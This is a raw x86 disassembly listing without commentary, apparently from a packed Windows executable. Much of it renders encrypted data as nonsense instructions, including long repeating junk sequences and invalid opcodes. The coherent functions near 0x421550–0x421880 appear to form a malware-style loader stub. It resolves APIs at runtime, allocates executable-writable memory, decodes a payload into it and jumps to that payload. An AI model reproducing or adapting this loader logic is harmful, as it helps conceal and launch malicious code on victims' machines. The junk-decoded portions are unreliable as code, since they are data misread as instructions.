  42140a:	mov    WORD PTR [eax],cs
  42140c:	dec    esi
  42140d:	cmp    DWORD PTR [esi+0x14],esi
  421410:	mov    ecx,0x7be6ade1
  421415:	push   0xffffff95
  421417:	test   BYTE PTR [eax+0x76a1d0be],ch
  42141d:	dec    ebx
  42141e:	out    dx,al
  42141f:	dec    ebx
  421420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421421:	cmp    eax,0x9f8e3cdd
  421426:	icebp  
  421427:	adc    edx,DWORD PTR [ebp+0xf]
  42142a:	icebp  
  42142b:	xchg   ebp,eax
  42142c:	in     eax,dx
  42142d:	mov    ebp,0xdba1ae7
  421432:	iret   
  421433:	jne    0x421485
  421435:	or     ebx,DWORD PTR [eax+ecx*8-0x67]
  421439:	out    0x1a,al
  42143b:	leave  
  42143c:	jp     0x421454
  42143e:	fimul  DWORD PTR [ebp-0x17]
  421441:	mov    bl,bl
  421443:	pop    edi
  421444:	pop    dx
  421446:	mov    dl,0x70
  421448:	sub    eax,0x9022f960
  42144d:	xchg   DWORD PTR [ebp+eiz*8-0x4163300f],ebx
  421454:	imul   ebx,DWORD PTR [esi+edx*2+0x583f8fc9],0xffffffe8
  42145c:	jb     0x42147a
  42145e:	out    dx,eax
  42145f:	mov    esi,0x1637fbc9
  421464:	retf   
  421465:	sub    al,0xf
  421467:	in     al,0x6b
  421469:	sbb    DWORD PTR [esi-0x6749e9b5],esi
  42146f:	mov    ebp,0xdfb7d336
  421474:	mov    edx,0xf624a56
  421479:	xor    bl,BYTE PTR ds:0xe90fc2a1
  42147f:	or     ax,0xce86
  421483:	lods   al,BYTE PTR ds:[esi]
  421484:	retf   0xa58f
  421487:	add    eax,DWORD PTR [edi-0x35]
  42148a:	mov    ds:0x16689ee9,eax
  42148f:	repz pop esp
  421491:	imul   eax,DWORD PTR [ecx-0x6f8ef81a],0x47
  421498:	aaa    
  421499:	jmp    0x5b91:0xfc3e7e9d
  4214a0:	and    eax,0xc6a9c130
  4214a5:	adc    bl,BYTE PTR [ebp-0x47]
  4214a8:	sub    ax,0x125b
  4214ac:	aad    0x72
  4214ae:	out    0xe1,al
  4214b0:	mov    bh,0x55
  4214b2:	(bad)  
  4214b3:	dec    eax
  4214b4:	mov    al,0xa3
  4214b6:	xor    BYTE PTR [eax],ah
  4214b8:	dec    eax
  4214b9:	mov    cl,0x42
  4214bb:	inc    ebp
  4214bc:	inc    eax
  4214bd:	cmp    al,0x98
  4214bf:	xchg   DWORD PTR [ecx+0x40],esi
  4214c2:	mov    ds:0x3d5fb91b,al
  4214c7:	jg     0x42145a
  4214c9:	out    0xcb,al
  4214cb:	leave  
  4214cc:	mov    dl,0x1d
  4214ce:	in     al,0x31
  4214d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214d1:	xchg   ebp,eax
  4214d2:	push   0x16
  4214d4:	and    al,0x7e
  4214d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214d7:	icebp  
  4214d8:	push   edi
  4214d9:	dec    edx
  4214da:	out    0xc5,eax
  4214dc:	xchg   ecx,eax
  4214dd:	mov    edx,0x20539f11
  4214e2:	fucomp st(2)
  4214e4:	mov    WORD PTR [ebx+ebp*2-0x35],?
  4214e8:	push   0x79f47d0
  4214ed:	mov    eax,0x9f4c1dec
  4214f2:	into   
  4214f3:	cmp    BYTE PTR [ebp+eax*2-0x4c],dh
  4214f7:	repnz repnz loope 0x42151a
  4214fb:	jo     0x421577
  4214fd:	daa    
  4214fe:	icebp  
  4214ff:	adc    eax,0xc66f6c99
  421504:	xor    eax,0x4773c213
  421509:	push   es
  42150a:	repnz xchg ebp,eax
  42150c:	xchg   edx,eax
  42150d:	cdq    
  42150e:	loop   0x421539
  421510:	sub    al,0xfa
  421512:	ret    0x797e
  421515:	ins    BYTE PTR es:[edi],dx
  421516:	mov    dh,0xdd
  421518:	jbe    0x421597
  42151a:	mov    edx,0xe330be93
  42151f:	sub    BYTE PTR [eax],ch
  421521:	out    0x36,al
  421523:	icebp  
  421524:	ret    
  421525:	fdivr  DWORD PTR [esi-0x4f]
  421528:	pop    ebp
  421529:	adc    al,0xdc
  42152b:	push   eax
  42152c:	mov    eax,DWORD PTR ds:0x666af192
  421532:	je     0x42152f
  421534:	xchg   esi,eax
  421535:	cmp    BYTE PTR [edi+edx*2+0x4b175356],bl
  42153c:	xor    ah,BYTE PTR [ebx-0x36]
  42153f:	xchg   ebp,eax
  421540:	les    ebp,FWORD PTR [ecx+0x18]
  421543:	pop    esi
  421544:	pop    ebp
  421545:	pop    ecx
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x10],0x0
  421565:	mov    DWORD PTR [ebp-0x18],0x0
  42156c:	mov    DWORD PTR [ebp-0x78],0x0
  421573:	mov    DWORD PTR [ebp-0x60],0x0
  42157a:	mov    DWORD PTR [ebp-0x5c],0x0
  421581:	mov    DWORD PTR [ebp-0x74],0x0
  421588:	mov    DWORD PTR [ebp-0x64],0x0
  42158f:	mov    DWORD PTR [ebp-0x8],0x0
  421596:	mov    DWORD PTR [ebp-0x68],0x0
  42159d:	mov    DWORD PTR [ebp-0x30],0x0
  4215a4:	mov    DWORD PTR [ebp-0x70],0x0
  4215ab:	mov    DWORD PTR [ebp-0x58],0x0
  4215b2:	mov    DWORD PTR [ebp-0x54],0x0
  4215b9:	mov    DWORD PTR [ebp-0x4],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x14],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428158
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42815c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428160
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428164
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x428148
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x42814c
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428150
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428154
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428156
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	call   DWORD PTR ds:0x428018
  421632:	lea    eax,[ebp-0x10]
  421635:	push   eax
  421636:	lea    ecx,[ebp-0x10]
  421639:	push   ecx
  42163a:	lea    edx,[ebp-0x18]
  42163d:	push   edx
  42163e:	call   DWORD PTR ds:0x428004
  421644:	test   eax,eax
  421646:	je     0x421651
  421648:	mov    eax,DWORD PTR [ebp-0x10]
  42164b:	add    eax,0x1
  42164e:	mov    DWORD PTR [ebp-0x10],eax
  421651:	mov    DWORD PTR [ebp-0x48],0x0
  421658:	mov    DWORD PTR [ebp-0x4c],0x0
  42165f:	lea    ecx,[ebp-0x18]
  421662:	push   ecx
  421663:	call   DWORD PTR ds:0x428000
  421669:	mov    BYTE PTR [ebp-0x40],0x56
  42166d:	call   DWORD PTR ds:0x428034
  421673:	mov    DWORD PTR [ebp-0x2c],eax
  421676:	mov    BYTE PTR [ebp-0x3e],0x72
  42167a:	movzx  edx,WORD PTR [ebp-0x2c]
  42167e:	test   edx,edx
  421680:	jne    0x4216d0
  421682:	mov    BYTE PTR [ebp-0x34],0x0
  421686:	mov    DWORD PTR [ebp-0x18],0xe0d
  42168d:	lea    eax,[ebp-0x28]
  421690:	push   eax
  421691:	call   DWORD PTR ds:0x428044
  421697:	mov    DWORD PTR [ebp-0x68],eax
  42169a:	mov    DWORD PTR [ebp-0x5c],0x3a
  4216a1:	lea    ecx,[ebp-0x40]
  4216a4:	push   ecx
  4216a5:	mov    edx,DWORD PTR [ebp-0x68]
  4216a8:	push   edx
  4216a9:	call   DWORD PTR ds:0x42804c
  4216af:	mov    DWORD PTR [ebp-0x44],eax
  4216b2:	mov    DWORD PTR [ebp-0x8],0xe6ff7d40
  4216b9:	mov    eax,DWORD PTR [ebp-0x68]
  4216bc:	push   eax
  4216bd:	mov    ecx,DWORD PTR [ebp-0x70]
  4216c0:	push   ecx
  4216c1:	call   DWORD PTR ds:0x428138
  4216c7:	mov    DWORD PTR [ebp-0x74],0x10e747
  4216ce:	jmp    0x4216e5
  4216d0:	mov    BYTE PTR ds:0x4476e0,0x0
  4216d7:	mov    BYTE PTR ds:0x42be60,0x0
  4216de:	mov    BYTE PTR ds:0x443920,0x0
  4216e5:	push   DWORD PTR ds:0x428044
  4216eb:	pop    edx
  4216ec:	mov    DWORD PTR [ebp-0x78],edx
  4216ef:	mov    edx,DWORD PTR [ebp-0x68]
  4216f2:	push   edx
  4216f3:	call   DWORD PTR ds:0x428048
  4216f9:	mov    eax,DWORD PTR [ebp-0x70]
  4216fc:	push   eax
  4216fd:	call   DWORD PTR ds:0x428050
  421703:	mov    DWORD PTR [ebp-0x2c],0x410000
  42170a:	push   DWORD PTR [ebp-0x30]
  42170d:	push   0x1000
  421712:	mov    eax,DWORD PTR [ebp-0x18]
  421715:	add    eax,0x23
  421718:	add    eax,0x23
  42171b:	push   eax
  42171c:	xor    eax,eax
  42171e:	push   eax
  42171f:	mov    ecx,DWORD PTR [ebp-0x44]
  421722:	call   ecx
  421724:	mov    edx,eax
  421726:	mov    DWORD PTR [ebp-0x4],edx
  421729:	mov    ecx,DWORD PTR [ebp-0x74]
  42172c:	sub    ecx,0xdae0b
  421732:	mov    DWORD PTR [ebp-0x74],ecx
  421735:	cmp    DWORD PTR [ebp-0x4],0x0
  421739:	jne    0x42174e
  42173b:	push   0xa
  42173d:	mov    edx,DWORD PTR [ebp-0x68]
  421740:	push   edx
  421741:	call   DWORD PTR ds:0x428058
  421747:	mov    BYTE PTR ds:0x443920,0x0
  42174e:	mov    eax,DWORD PTR [ebp-0x4]
  421751:	add    eax,DWORD PTR [ebp-0x18]
  421754:	mov    ecx,DWORD PTR [ebp-0x8]
  421757:	mov    DWORD PTR [eax],ecx
  421759:	mov    edx,DWORD PTR [ebp-0x4]
  42175c:	add    edx,DWORD PTR [ebp-0x5c]
  42175f:	mov    DWORD PTR [ebp-0x64],edx
  421762:	mov    eax,ds:0x42804c
  421767:	mov    DWORD PTR [ebp-0x54],eax
  42176a:	mov    ecx,DWORD PTR [ebp-0x4]
  42176d:	add    ecx,DWORD PTR [ebp-0x18]
  421770:	mov    edx,DWORD PTR [ebp+0x8]
  421773:	mov    DWORD PTR [ecx+0x4],edx
  421776:	mov    eax,DWORD PTR [ebp-0x4]
  421779:	add    eax,DWORD PTR [ebp-0x18]
  42177c:	mov    DWORD PTR [ebp-0xc],eax
  42177f:	push   0x0
  421781:	push   0x14
  421783:	push   0x14
  421785:	push   0xa
  421787:	push   0xa
  421789:	push   0x0
  42178b:	call   DWORD PTR ds:0x428010
  421791:	cmp    DWORD PTR [ebp-0x74],0x0
  421795:	jbe    0x4217b2
  421797:	mov    ecx,DWORD PTR [ebp-0xc]
  42179a:	push   ecx
  42179b:	mov    edx,DWORD PTR [ebp-0x18]
  42179e:	push   edx
  42179f:	mov    eax,DWORD PTR [ebp-0x2c]
  4217a2:	add    eax,DWORD PTR [ebp-0x74]
  4217a5:	push   eax
  4217a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4217a9:	push   ecx
  4217aa:	call   0x411000
  4217af:	add    esp,0x10
  4217b2:	cmp    DWORD PTR [ebp-0x64],0x0
  4217b6:	je     0x4217ca
  4217b8:	mov    ecx,DWORD PTR [ebp-0x54]
  4217bb:	push   ecx
  4217bc:	push   DWORD PTR [ebp-0x78]
  4217bf:	mov    esi,DWORD PTR [ebp-0x64]
  4217c2:	push   edx
  4217c3:	pop    eax
  4217c4:	push   ecx
  4217c5:	nop
  4217c6:	jmp    esi
  4217c8:	jmp    0x4217dc
  4217ca:	mov    edx,DWORD PTR [ebp+0x8]
  4217cd:	mov    DWORD PTR [ebp-0x14],edx
  4217d0:	push   0x0
  4217d2:	mov    eax,DWORD PTR [ebp-0x68]
  4217d5:	push   eax
  4217d6:	call   DWORD PTR ds:0x42800c
  4217dc:	mov    eax,0x1
  4217e1:	pop    esi
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    
  4217e6:	int3   
  4217e7:	int3   
  4217e8:	int3   
  4217e9:	int3   
  4217ea:	int3   
  4217eb:	int3   
  4217ec:	int3   
  4217ed:	int3   
  4217ee:	int3   
  4217ef:	int3   
  4217f0:	push   ebp
  4217f1:	mov    ebp,esp
  4217f3:	sub    esp,0x8
  4217f6:	push   esi
  4217f7:	push   0x0
  4217f9:	push   0x0
  4217fb:	mov    DWORD PTR [ebp-0x4],0x0
  421802:	call   DWORD PTR ds:0x428138
  421808:	mov    esi,DWORD PTR ds:0x428034
  42180e:	push   0x0
  421810:	push   0x0
  421812:	push   0x0
  421814:	push   0x0
  421816:	mov    DWORD PTR [ebp-0x8],esi
  421819:	call   DWORD PTR ds:0x42802c
  42181f:	test   esi,esi
  421821:	jne    0x42182a
  421823:	push   esi
  421824:	call   DWORD PTR ds:0x428028
  42182a:	push   0x0
  42182c:	push   0x4e
  42182e:	push   0x1e
  421830:	push   0x0
  421832:	push   0xffffffff
  421834:	call   DWORD PTR ds:0x428024
  42183a:	mov    esi,DWORD PTR [ebp-0x8]
  42183d:	call   esi
  42183f:	mov    DWORD PTR [ebp-0x4],eax
  421842:	cmp    DWORD PTR [ebp-0x4],0x57
  421846:	jne    0x42185d
  421848:	push   0x77db0930
  42184d:	call   0x421550
  421852:	add    esp,0x4
  421855:	push   0x0
  421857:	call   DWORD PTR ds:0x428020
  42185d:	push   0x0
  42185f:	push   0x0
  421861:	push   0x100000
  421866:	call   DWORD PTR ds:0x42801c
  42186c:	xor    eax,eax
  42186e:	pop    esi
  42186f:	mov    esp,ebp
  421871:	pop    ebp
  421872:	ret    
  421873:	nop
  421874:	nop
  421875:	nop
  421876:	nop
  421877:	nop
  421878:	nop
  421879:	nop
  42187a:	nop
  42187b:	nop
  42187c:	nop
  42187d:	nop
  42187e:	nop
  42187f:	nop
  421880:	sub    esp,0x10
  421883:	push   0x0
  421885:	push   0x0
  421887:	push   0x0
  421889:	call   0x422a10
  42188e:	push   0x0
  421890:	call   DWORD PTR ds:0x428040
  421896:	lea    eax,[esp+0x0]
  42189a:	push   eax
  42189b:	call   DWORD PTR ds:0x42803c
  4218a1:	call   DWORD PTR ds:0x428038
  4218a7:	cmp    WORD PTR [esp+0x0],0x0
  4218ad:	je     0x4218c6
  4218af:	push   0x0
  4218b1:	call   DWORD PTR ds:0x428054
  4218b7:	push   0x0
  4218b9:	call   0x4217f0
  4218be:	add    esp,0x4
  4218c1:	jmp    0x4229f3
  4218c6:	push   DWORD PTR [edx+eiz*8-0x74a5f16]
  4218cd:	add    eax,DWORD PTR [ebp-0x19]
  4218d0:	pop    eax
  4218d1:	cdq    
  4218d2:	sub    bh,BYTE PTR [esi+eax*1-0x48]
  4218d6:	jp     0x4218f0
  4218d8:	mov    dh,0xf8
  4218da:	add    eax,DWORD PTR [ebp-0x1d]
  4218dd:	pop    eax
  4218de:	cdq    
  4218df:	push   0xffffff83
  4218e1:	stc    
  4218e2:	mov    eax,0xf8b6a07a
  4218e7:	add    eax,DWORD PTR [ebp-0x1d]
  4218ea:	pop    eax
  4218eb:	cdq    
  4218ec:	sub    al,BYTE PTR [ebx-0x5f854707]
  4218f2:	mov    dh,0xf8
  4218f4:	add    eax,DWORD PTR [ebp-0x1d]
  4218f7:	pop    eax
  4218f8:	cdq    
  4218f9:	sub    al,BYTE PTR [ebx-0x5f854707]
  4218ff:	mov    dh,0xf8
  421901:	add    eax,DWORD PTR [ebp+0x1b]
  421904:	pop    eax
  421905:	cdq    
  421906:	sub    cl,BYTE PTR [ebp-0x5f8bfd1a]
  42190c:	add    dh,cl
  42190e:	into   
  42190f:	fs pop ebx
  421911:	pop    ecx
  421912:	aad    0xe7
  421914:	mov    ds:0xd313d0ad,al
  421919:	xchg   esi,eax
  42191a:	mov    BYTE PTR [ecx+0x2a],dh
  42191d:	test   BYTE PTR [edx],ch
  42191f:	clc    
  421920:	inc    edi
  421921:	mov    ds:0xce14d99a,eax
  421926:	(bad)  [ebx+eiz*1-0x148779d9]
  42192d:	pop    edi
  42192e:	in     eax,dx
  42192f:	(bad)  
  421931:	adc    al,0x80
  421933:	repnz mov bh,0x50
  421936:	mov    ?,WORD PTR gs:[edi]
  421939:	std    
  42193a:	dec    edi
  42193b:	lods   eax,DWORD PTR ds:[esi]
  42193c:	hlt    
  42193d:	mov    ch,0x70
  42193f:	test   BYTE PTR [esi-0x1cbafc08],dh
  421945:	pop    eax
  421946:	cdq    
  421947:	sub    eax,0x39e1051a
  42194c:	pop    eax
  42194d:	and    al,0xf2
  42194f:	inc    eax
  421950:	mov    ebp,0xd2da5271
  421955:	adc    ebx,esi
  421957:	loopne 0x421978
  421959:	lods   al,BYTE PTR ds:[esi]
  42195a:	mov    esp,0xe9d7fba7
  42195f:	add    ah,bh
  421961:	adc    cl,BYTE PTR [ecx-0x5517bfc5]
  421967:	out    dx,al
  421968:	popf   
  421969:	cmp    cl,BYTE PTR [edi-0x75]
  42196c:	mov    al,ds:0x77af200b
  421971:	xor    DWORD PTR [eax-0x1a],0xf096a4e
  421978:	arpl   WORD PTR [ecx-0x6d],cx
  42197b:	pusha  
  42197c:	jnp    0x4219e9
  42197e:	mov    dl,0x30
  421980:	and    BYTE PTR [edi+0x71bd5bf2],dh
  421986:	push   edx
  421987:	fcmovbe st,st(2)
  421989:	adc    bl,dh
  42198b:	nop
  42198c:	xor    DWORD PTR [edx],0xffffffbc
  42198f:	inc    edi
  421990:	fcmovnb st,st(5)
  421992:	jmp    0x89fa7aac
  421997:	mov    eax,ds:0xbeaa47dd
  42199c:	add    BYTE PTR [ecx-0x6ec244b1],dl
  4219a2:	and    cl,al
  4219a4:	add    DWORD PTR [edx],ebp
  4219a6:	jo     0x4219a0
  4219a8:	shl    edi,cl
  4219aa:	or     DWORD PTR [edi],eax
  4219ac:	sbb    ecx,edx
  4219ae:	xchg   ebx,eax
  4219af:	js     0x42199b
  4219b1:	call   0x3f2:0x245839d0
  4219b8:	inc    ebp
  4219b9:	jecxz  0x421a13
  4219bb:	cdq    
  4219bc:	sub    al,BYTE PTR [ebx-0x5fc01707]
  4219c2:	mov    dh,0xb4
  4219c4:	add    al,BYTE PTR [edi-0x1d]
  4219c7:	mov    ah,0x7a
  4219c9:	jne    0x421997
  4219cb:	stc    
  4219cc:	mov    eax,0xf8b6a07a
  4219d1:	add    eax,DWORD PTR [ebp+0x3]
  4219d4:	pop    eax
  4219d5:	call   0xa07a:0xb2f8882b
  4219dc:	pop    edx
  4219dd:	cld    
  4219de:	add    eax,DWORD PTR [ebp-0x19]
  4219e1:	pop    esi
  4219e2:	cdq    
  4219e3:	sub    al,BYTE PTR [ebx+0x1d7bb8f9]
  4219e9:	mov    dh,0xf8
  4219eb:	add    edx,DWORD PTR [ebp-0x1d]
  4219ee:	pop    eax
  4219ef:	cdq    
  4219f0:	sub    al,BYTE PTR [esi-0x1e854707]
  4219f6:	mov    dh,0xf8
  4219f8:	adc    eax,DWORD PTR [ebp-0x1d]
  4219fb:	pop    eax
  4219fc:	fwait
  4219fd:	sub    al,BYTE PTR [ebx-0x5f844704]
  421a03:	mov    dh,0xf8
  421a05:	add    eax,DWORD PTR [ebp-0x1a]
  421a08:	pop    eax
  421a09:	cwde   
  421a0a:	sub    al,BYTE PTR [ebx-0x5f854707]
  421a10:	repz add eax,DWORD PTR ss:[ebp-0x19]
  421a15:	pop    eax
  421a16:	cdq    
  421a17:	xchg   edi,eax
  421a18:	mov    dl,0xfc
  421a1a:	mov    eax,0x78b6a078
  421a1f:	add    eax,DWORD PTR [ebp-0xd]
  421a22:	pop    eax
  421a23:	cdq    
  421a24:	cmp    al,BYTE PTR [ebx-0x4f854707]
  421a2a:	mov    dh,0xf8
  421a2c:	adc    eax,DWORD PTR [ebp-0x1d]
  421a2f:	pop    eax
  421a30:	cdq    
  421a31:	sub    al,BYTE PTR [ebx-0x5f854717]
  421a37:	mov    dh,0xf8
  421a39:	add    eax,DWORD PTR [ebp-0x1d]
  421a3c:	pop    eax
  421a3d:	cdq    
  421a3e:	sub    al,BYTE PTR [edi]
  421a40:	xchg   edi,eax
  421a41:	mov    bl,0x7a
  421a43:	leave  
  421a44:	mov    ch,0xf8
  421a46:	add    eax,DWORD PTR [ebp-0x2d]
  421a49:	push   ebx
  421a4a:	cdq    
  421a4b:	in     eax,0xbe
  421a4d:	stc    
  421a4e:	mov    eax,0xf8b6a07a
  421a53:	add    eax,DWORD PTR [ebp-0x1d]
  421a56:	pop    eax
  421a57:	cdq    
  421a58:	sub    al,BYTE PTR [ebx-0x5f854707]
  421a5e:	mov    dh,0xf8
  421a60:	add    eax,DWORD PTR [ebp-0x1d]
  421a63:	pop    eax
  421a64:	cdq    
  421a65:	sub    al,BYTE PTR [ebx-0x5f854707]
  421a6b:	mov    dh,0xf8
  421a6d:	add    eax,DWORD PTR [ebp-0x1d]
  421a70:	pop    eax
  421a71:	cdq    
  421a72:	sub    al,BYTE PTR [ebx-0x5f854707]
  421a78:	mov    dh,0xf8
  421a7a:	add    eax,DWORD PTR [ebp-0x1d]
  421a7d:	pop    eax
  421a7e:	cdq    
  421a7f:	sub    al,BYTE PTR [ebx-0x5f854707]
  421a85:	mov    dh,0xf8
  421a87:	add    eax,DWORD PTR [ebp-0x1d]
  421a8a:	pop    eax
  421a8b:	cdq    
  421a8c:	sub    al,BYTE PTR [ebx-0x5f854707]
  421a92:	mov    dh,0xf8
  421a94:	add    eax,DWORD PTR [ebp-0x1d]
  421a97:	pop    eax
  421a98:	cdq    
  421a99:	sub    al,BYTE PTR [ebx-0x5f854707]
  421a9f:	mov    dh,0xf8
  421aa1:	add    eax,DWORD PTR [ebp-0x1d]
  421aa4:	pop    eax
  421aa5:	cdq    
  421aa6:	sub    al,BYTE PTR [ebx-0x5f854707]
  421aac:	mov    dh,0xf8
  421aae:	add    eax,DWORD PTR [ebp-0x1d]
  421ab1:	pop    eax
  421ab2:	cdq    
  421ab3:	sub    al,BYTE PTR [ebx-0x2bab4707]
  421ab9:	rol    DWORD PTR [eax+0x58e34577],cl
  421abf:	cdq    
  421ac0:	or     cl,BYTE PTR [eax-0x5f954707]
  421ac6:	mov    dh,0xf8
  421ac8:	cmp    DWORD PTR [ecx-0x1d],eax
  421acb:	pop    eax
  421acc:	popf   
  421acd:	sub    al,BYTE PTR [ebx-0x6dc60257]
  421ad3:	loop   0x421a8c
  421ad5:	add    eax,DWORD PTR [ebp-0x1d]
  421ad8:	pop    eax
  421ad9:	cdq    
  421ada:	sub    ah,BYTE PTR [ebx-0x71654707]
  421ae0:	les    ecx,FWORD PTR [ebx+0x58e32671]
  421ae6:	cdq    
  421ae7:	sub    dl,bl
  421ae9:	stc    
  421aea:	mov    eax,0xf8bd907a
  421aef:	add    edx,DWORD PTR ds:0x149958e3
  421af5:	xchg   ecx,edi
  421af7:	mov    eax,0xf8b6a07a
  421afc:	add    eax,DWORD PTR [ebp-0x1d]
  421aff:	pop    eax
  421b00:	cdq    
  421b01:	sub    al,BYTE PTR [ebx+0x407ab8d9]
  421b07:	mov    dh,0xf8
  421b09:	add    eax,DWORD PTR [ebp-0x1d]
  421b0c:	pop    eax
  421b0d:	cdq    
  421b0e:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b14:	mov    dh,0xf8
  421b16:	add    eax,DWORD PTR [ebp-0x1d]
  421b19:	pop    eax
  421b1a:	cdq    
  421b1b:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b21:	mov    dh,0xf8
  421b23:	add    eax,DWORD PTR [ebp-0x1d]
  421b26:	pop    eax
  421b27:	cdq    
  421b28:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b2e:	mov    dh,0xf8
  421b30:	add    eax,DWORD PTR [ebp-0x1d]
  421b33:	pop    eax
  421b34:	cdq    
  421b35:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b3b:	mov    dh,0xf8
  421b3d:	add    eax,DWORD PTR [ebp-0x1d]
  421b40:	pop    eax
  421b41:	cdq    
  421b42:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b48:	mov    dh,0xf8
  421b4a:	add    eax,DWORD PTR [ebp-0x1d]
  421b4d:	pop    eax
  421b4e:	cdq    
  421b4f:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b55:	mov    dh,0xf8
  421b57:	add    eax,DWORD PTR [ebp-0x1d]
  421b5a:	pop    eax
  421b5b:	cdq    
  421b5c:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b62:	mov    dh,0xf8
  421b64:	add    eax,DWORD PTR [ebp-0x1d]
  421b67:	pop    eax
  421b68:	cdq    
  421b69:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b6f:	mov    dh,0xf8
  421b71:	add    eax,DWORD PTR [ebp-0x1d]
  421b74:	pop    eax
  421b75:	cdq    
  421b76:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b7c:	mov    dh,0xf8
  421b7e:	add    eax,DWORD PTR [ebp-0x1d]
  421b81:	pop    eax
  421b82:	cdq    
  421b83:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b89:	mov    dh,0xf8
  421b8b:	add    eax,DWORD PTR [ebp-0x1d]
  421b8e:	pop    eax
  421b8f:	cdq    
  421b90:	sub    al,BYTE PTR [ebx-0x5f854707]
  421b96:	mov    dh,0xf8
  421b98:	add    eax,DWORD PTR [ebp-0x1d]
  421b9b:	pop    eax
  421b9c:	cdq    
  421b9d:	sub    al,BYTE PTR [ebx-0x5f854707]
  421ba3:	mov    dh,0xf8
  421ba5:	add    eax,DWORD PTR [ebp-0x1d]
  421ba8:	pop    eax
  421ba9:	cdq    
  421baa:	sub    al,BYTE PTR [ebx-0x5f854707]
  421bb0:	mov    dh,0xf8
  421bb2:	add    eax,DWORD PTR [ebp-0x1d]
  421bb5:	pop    eax
  421bb6:	cdq    
  421bb7:	sub    al,BYTE PTR [ebx-0x5f854707]
  421bbd:	mov    dh,0xf8
  421bbf:	add    eax,DWORD PTR [ebp-0x1d]
  421bc2:	pop    eax
  421bc3:	cdq    
  421bc4:	sub    al,BYTE PTR [ebx-0x5f854707]
  421bca:	mov    dh,0xf8
  421bcc:	add    eax,DWORD PTR [ebp-0x1d]
  421bcf:	pop    eax
  421bd0:	cdq    
  421bd1:	sub    al,BYTE PTR [ebx-0x5f854707]
  421bd7:	mov    dh,0xf8
  421bd9:	add    eax,DWORD PTR [ebp-0x1d]
  421bdc:	pop    eax
  421bdd:	cdq    
  421bde:	sub    al,BYTE PTR [ebx-0x5f854707]
  421be4:	mov    dh,0xf8
  421be6:	add    eax,DWORD PTR [ebp-0x1d]
  421be9:	pop    eax
  421bea:	cdq    
  421beb:	sub    al,BYTE PTR [ebx-0x5f854707]
  421bf1:	mov    dh,0xf8
  421bf3:	add    eax,DWORD PTR [ebp-0x1d]
  421bf6:	pop    eax
  421bf7:	cdq    
  421bf8:	sub    al,BYTE PTR [ebx-0x5f854707]
  421bfe:	mov    dh,0xf8
  421c00:	add    eax,DWORD PTR [ebp-0x1d]
  421c03:	pop    eax
  421c04:	cdq    
  421c05:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c0b:	mov    dh,0xf8
  421c0d:	add    eax,DWORD PTR [ebp-0x1d]
  421c10:	pop    eax
  421c11:	cdq    
  421c12:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c18:	mov    dh,0xf8
  421c1a:	add    eax,DWORD PTR [ebp-0x1d]
  421c1d:	pop    eax
  421c1e:	cdq    
  421c1f:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c25:	mov    dh,0xf8
  421c27:	add    eax,DWORD PTR [ebp-0x1d]
  421c2a:	pop    eax
  421c2b:	cdq    
  421c2c:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c32:	mov    dh,0xf8
  421c34:	add    eax,DWORD PTR [ebp-0x1d]
  421c37:	pop    eax
  421c38:	cdq    
  421c39:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c3f:	mov    dh,0xf8
  421c41:	add    eax,DWORD PTR [ebp-0x1d]
  421c44:	pop    eax
  421c45:	cdq    
  421c46:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c4c:	mov    dh,0xf8
  421c4e:	add    eax,DWORD PTR [ebp-0x1d]
  421c51:	pop    eax
  421c52:	cdq    
  421c53:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c59:	mov    dh,0xf8
  421c5b:	add    eax,DWORD PTR [ebp-0x1d]
  421c5e:	pop    eax
  421c5f:	cdq    
  421c60:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c66:	mov    dh,0xf8
  421c68:	add    eax,DWORD PTR [ebp-0x1d]
  421c6b:	pop    eax
  421c6c:	cdq    
  421c6d:	sub    al,BYTE PTR [ebx-0x5f854707]
  421c73:	mov    dh,0xf8
  421c75:	add    eax,DWORD PTR [ebp-0x1d]
  421c78:	pop    eax
  421c79:	cdq    
